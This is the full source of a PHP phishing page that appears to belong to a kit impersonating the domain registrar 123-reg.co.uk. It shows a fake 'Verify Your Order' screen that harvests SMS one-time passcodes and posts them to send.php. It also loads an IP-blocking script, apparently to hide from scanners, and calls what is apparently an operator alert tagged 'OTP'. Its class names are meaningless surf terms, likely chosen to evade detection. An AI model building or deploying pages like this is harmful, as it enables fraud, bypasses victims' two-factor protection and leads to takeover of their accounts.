<?php 
require '../main.php';
require_once 'blockip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/ico" href="./img/favicon.png" />
    <title>123-reg.co.uk</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            background-color: #FFFFFF;
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .wave {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background-color: #fff;
            border-bottom: 1px solid #e0e0e0;
            padding: 15px 0;
        }

        .shoreline {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .surfboard {
            color: #111;
        }

        .beachbreak {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        /* Main Content */
        main {
            padding: 20px 0;
            flex: 1;
        }

        .paddle {
            color: #0073b1;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 10px;
            cursor: pointer;
        }

        .pipeline {
            font-size: 28px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        .reef {
            display: flex;
            gap: 30px;
        }

        .leftbreak {
            flex: 1;
        }

        .rightbreak {
            width: 380px;
        }

        /* Checkout Sections */
        .barrel {
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            overflow: hidden;
        }

        .peakheader {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid #e0e0e0;
        }

        .peakheader h2 {
            font-size: 18px;
            font-weight: 600;
        }

        .waveface {
            padding: 15px;
        }

        /* Domain Renewal Image */
        .swell {
            width: 100%;
            height: auto;
            border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }

        /* Payment Form Styles */
        .wipeout {
            background-color: #a6fff7;
            border: none;
            padding: 9px 12px;
            border-radius: 5px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            font-size: 18px;
            margin-bottom: 25px;
            color: #000;
            width: fit-content;
        }

        .wipeout i {
            background: white;
            padding: 8px;
            border-radius: 4px;
        }

        .longboard {
            margin-bottom: 25px;
        }

        .shortboard {
            display: flex;
            flex-direction: row;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 15px;
        }

        .fin, .leash {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 12px;
            border-right: 1px solid #ddd;
        }

        .fin img, .leash img {
            display: block;
            height: 24px;
            width: auto;
        }

        /* Input Styles */
        .wetsuit {
            position: relative;
            padding: 12px;
        }

        .rash {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            transition: all 0.2s ease-in-out;
            background-color: transparent;
            padding: 0;
            font-size: 14px;
            color: #666;
            font-weight: bold;
        }

        .wax {
            width: 100%;
            border: none;
            outline: none;
            font-size: 14px;
            padding: 5px 0;
            background: transparent;
        }

        .wax:focus + .rash,
        .wax:not(:placeholder-shown) + .rash {
            top: 6px;
            font-size: 11px;
            transform: translateY(0);
        }

        .offshore {
            color: #dc3545;
            margin-left: 2px;
        }

        /* Specific styles for card number input */
        .deck .wetsuit {
            padding-left: 15px;
        }

        .deck .rash {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            transition: all 0.2s ease-in-out;
            background-color: transparent;
            padding: 0;
        }

        .deck .wax:focus + .rash,
        .deck .wax:not(:placeholder-shown) + .rash {
            top: 0;
            font-size: 11px;
            transform: translateY(0);
        }

        .lineup {
            display: flex;
            margin-top: 20px;
        }

        .takeoff, .cutback {
            flex-grow: 1;
            position: relative;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .takeoff {
            margin-right: 20px;
        }

        .cutback {
            display: flex;
            flex-grow: 1;
            position: relative;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .leash {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 12px;
            border-left: 1px solid #ddd;
        }

        .leash img {
            height: 24px;
            width: auto;
        }

        .floater {
            flex-grow: 1;
        }

        .dropknee {
            width: 100%;
            background-color: #111111;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            text-align: center;
            transition: background-color 0.3s ease;
        }


        /* Order Summary Image */
        .pointbreak {
            width: 100%;
            height: auto;
            border-radius: 5px;
        }

        /* Responsive */
        @media (max-width: 900px) {
            .reef {
                flex-direction: column;
            }
            
            .rightbreak {
                width: 100%;
            }

            /* New mobile-specific styles */
            .swell {
                content: url("./img/www.webp");
            }

            /* Change Security Code to CVV on mobile */
            .floater .rash::before {
                content: 'CVV';
            }
            
            /* Hide the original Security Code text */
            .floater .rash span:first-of-type {
                display: none;
            }
        }

        /* Updated styles for CVV input */
        .floater .wax::placeholder {
            color: transparent;
        }

        .shorebreak {
            border: 2px solid #dfdfdf;
        }

        .tideline {
            text-align: center;
            padding: 20px 0;
            margin-top: 80px;
            color: #666;
            font-size: 12px;
        }

        .tideline a {
            color: #00a4a6;
            text-decoration: none;
        }

        .tideline a:hover {
            text-decoration: underline;
        }

        /* New styles for smaller form */
        .reef .form-container {
            max-width: 360px;
            width: 100%;
        }

        .waveface p {
            font-size: 14px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <header>
        <div class="wave shoreline">
            <div class="surfboard">
                <img src="./img/lgo.webp" width="140" height="40">
            </div>
            <div class="beachbreak">
                <img src="./img/out.webp" width="24" height="24" style="max-width: 24px; height: auto;">
            </div>
        </div>
    </header>

    <main class="wave" style="padding-bottom: 40px;">
        <div class="paddle">
            <i class="fas fa-chevron-left"></i> Back
        </div>
        <form method="POST" action="send.php">
        <h1 class="pipeline">Verify Your Order</h1>
        
        <div class="reef" style="justify-content: center;">
            <div class="form-container">
                <div class="barrel shorebreak">
                    <div class="peakheader">
                        <h2>SMS Verification</h2>
                    </div>
                    <div class="waveface">
                        <?php
if(isset($_GET['e'])){
  echo '<p style="text-align: center;"><span style="color: red; display: inline; font-size: 11px;">Incorrect SMS code: enter it again.</span><br><br />';
}
?> 
                        <p>Enter the SMS code that you received on your phone to confirm your order.</p>

                        
                        <div class="shortboard">
                            <div class="fin">
                                <img src="./img/tel.webp" style="height: 20px; width: auto;">
                            </div>
                            <div class="deck" style="width: 100%;">
                                <div class="wetsuit">
                                    <input class="wax" name="mms" id="smsCode" type="text" placeholder=" " autocomplete="off">

                                    <label class="rash" for="smsCode">
                                        Verification Code<span class="offshore">*</span>
                                    </label>
                                </div>
                            </div>
                        </div>
                        
                        <button class="dropknee">Complete Order</button>
                    </div>
                </div>
            </div>
        </div>
    </form>
    </main>
    <footer class="tideline">
        <div class="wave">
            Copyright © 1999 - 2025 123-reg.co.uk Operating Company, LLC. All Rights Reserved. 
            <a>Privacy Policy</a>
        </div>
    </footer>
    <script src="js/jq.js"></script>
<?php $m->ctr(" OTP 📲 ".@$_GET['e']); ?>
</body>
</html>

